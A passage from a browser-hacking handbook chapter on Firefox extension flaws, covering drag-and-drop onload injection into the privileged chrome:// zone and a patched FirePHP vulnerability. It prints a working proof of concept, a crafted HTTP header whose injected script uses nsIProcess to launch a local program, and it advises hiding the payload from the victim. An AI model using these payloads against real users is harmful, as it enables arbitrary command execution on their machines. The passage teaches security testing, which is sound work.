
An important note to remember is that when an HTML element with attributes or a DOM node is dragged in this way, all properties, attributes, and methods are copied to the new location. This is of specific concern when the element is dragged into the chrome:// zone. A previously innocuous image with a JavaScript onLoad handler can, once dragged and dropped into the privileged zone, execute without restriction:

```
<img src="http://browserhacker.com/exploit.gif" onload="your_javascript">
```

For example, the preceding image tag will load the image into the web page and execute the onload code in the unprivileged browser context. Then if your victim drags the image into the chrome:// zone, the onload code will execute once again. This time when the DOM event handlers run the onload function, it will have elevated privileges.

Nick Freeman discovered a very similar vulnerability in the ScribeFire43 Firefox extension. This extension allows users to post to their blogs from any origin. The vulnerability was within the way users would drag images (from arbitrary origins) to the chrome:// zone. Just like in the previous example, ScribeFire would allow you to smuggle your instructions into the onload function to have them execute in the privileged context.

Exploitation of DOM events requires careful examination of how the extension is handling input from the user. Ultimately, the goal is the same as the other discussed methods; to gain arbitrary JavaScript execution in the chrome:// zone.

## Achieving OS Command Execution

Once you have an XCS vulnerability, it may be possible to leverage it to execute arbitrary operating system commands. This means that you can potentially smuggle your commands into the chrome:// zone and execute commands as if you’re typing them at the command line. However, before we get to that, let’s first explore an example of how to launch operating system commands on Firefox.

### Firefox Remote Command Execution Example

As mentioned previously, how you exploit the target extension depends entirely on how the developers have implemented it. Extensions can use HTTP headers to guide their execution flow, which ultimately puts HTTP headers firmly in your cross hairs.

The FirePHP Firefox extension grabs some of the headers returned from the server and uses them to decide what to present in the Firebug console. The presence of the custom headers will be very obvious if you can intercept the response from the server. The following headers show some of the HTTP headers that the FirePHP extension is looking for:

```
HTTP/1.1 200 OK
Date: Thu, 08 Aug 2013 14:18:44 GMT
Server: Apache
Last-Modified: Fri, 29 Mar 2013 22:45:39 GMT
ETag: "401b9-0-4d91807c0760e"
Accept-Ranges: bytes
Content-Length: 0
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: text/html
X-Wf-Protocol-1: http://meta.wildfirehq.org/Protocol/JsonStream/0.2
X-Wf-1-Plugin-1: http://meta.firephp.org/Wildfire/Plugin/FirePHP/
Library-FirePHPCore/0.3
X-Wf-1-Structure-1: http://meta.firephp.org/Wildfire/Structure/FirePHP/Dump/0.1
X-Wf-1-1-1-1: 29|["Browser Hacker's Handbook"]|
```

You will notice in the headers that the string Browser Hacker's Handbook has been inserted. Examining [Figure 7-18](#c07.html#figure7-18), you can see that the string has been displayed in a dialog box. This gives you confirmation that the headers do, in this instance, form part of the extension’s attack surface.

 start figure 

[**Figure 7-18:**](#c07.html#figureanchor7-18) FirePHP displaying data from server

![c07f018.tif](image_fi/662090c07/c07f018.png)

 end figure 

Now let’s delve into an extension vulnerability discovered by Eldar Marcussen.44 The vulnerability affects all FirePHP versions up to 0.7.1 and you can download it from [https://addons.mozilla.org/en-US/firefox/addon/firephp/versions](https://addons.mozilla.org/en-US/firefox/addon/firephp/versions). You will need to install it via the Install Add-on From File option in the Extensions tab.

Now that you have the freshly installed vulnerable extension, it is time to set up the environment. Make sure the Net tab is enabled in Firebug, enter the following code in the console, and click Run:

```
console.log('Exploit FirePHP start')
xhr = new XMLHttpRequest();
xhr.open("GET","http://browserhacker.com/",true); 
xhr.send();
console.log('Mouseover FirePHP array to finish')
```

This code sends an XHR request to http://browserhacker.com, which will simulate an opportunity to attack your victim. FirePHP looks for key headers in the response and where the vulnerability is located. You are particularly interested in the X-Wf-1-1-1-1 header, which when parsed will launch the exploit. This is the header that you need to smuggle your instructions into. If you can craft the response header correctly, your operating system commands will be executed.

For this demonstration, you want to intercept the HTTP communication using a proxy and inject the exploit into the response. Simply use your favorite real-time proxy and add the target FirePHP headers (identified by X-Wf).

The following headers will launch the calculator application on OSX:

```
HTTP/1.1 200 OK
Date: Wed, 07 Aug 2013 00:27:48 GMT
Server: Apache
Last-Modified: Fri, 29 Mar 2013 22:45:39 GMT
ETag: "401b9-0-4d91807c0760e"
Accept-Ranges: bytes
Content-Length: 0
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: text/html
X-Wf-Protocol-1: http://meta.wildfirehq.org/Protocol/JsonStream/0.2
X-Wf-1-Plugin-1: http://meta.firephp.org/Wildfire/Plugin/FirePHP/
Library-FirePHPCore/0.3
X-Wf-1-Structure-1: http://meta.firephp.org/Wildfire/Structure/FirePHP/Dump/0.1
X-Wf-1-1-1-1: 476|{"RequestHeaders":{"1":"1","2":"2","3":"3","4":"4","5":"5",
"6":"6","7":"7","8":"8","9":"9","UR<script>var lFile=Components.classes
[\"@mozilla.org/file/
local;1\"].createInstance
(Components.interfaces.nsILocalFile);lFile.initWithPath
(\"/Applications/Calculator.app/Contents/MacOS/Calculator\");var process=
Components.classes[\"@mozilla.org/process/util;1\"]
.createInstance(Components.interfaces.nsIProcess);process.init(lFile);
process.run(true,[],0);void(0);<\/script>":"PWND}}|
```

This exploit requires one more step. The victim needs to move the mouse over the Dump line in the console to trigger the Variable Viewer, which in turn exploits the browser extension. This runs the Calculator.app and the outcome is shown in [Figure 7-19](#c07.html#figure7-19).

In this instance, the attack has been hidden from the victim using a large array so that the exploit is not shown in the console. A secondary advantage is that the string uses more screen real estate, so it is more likely that the victim will inadvertently pass the mouse over it.

 start figure 

[**Figure 7-19:**](#c07.html#figureanchor7-19) FirePHP exploitation on OSX

![c07f019.tif](image_fi/662090c07/c07f019.png)

 end figure 

Now you have exploited the FirePHP vulnerability on OSX. This extension can equally be exploited on Windows by updating the length and using the following string as a parameter to the lFile.initWithPath call:

```
"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\calc.exe\"
```

This vulnerability could have been exploited on any operating system where Firefox can be installed. Vulnerabilities in Firefox extensions are almost invariably easy to exploit across operating systems.

The developers of FirePHP have now fixed the vulnerability. Check out the patch at [https://github.com/firephp/firephp-extension/commit/fccab466cd5f014c36082d76ae300f2cd612ba51](https://github.com/firephp/firephp-extension/commit/fccab466cd5f014c36082d76ae300f2cd612ba51). You will see multiple places throughout the code that concatenate attacker-controlled content without encoding or filtering.

## Achieving OS Command Injection
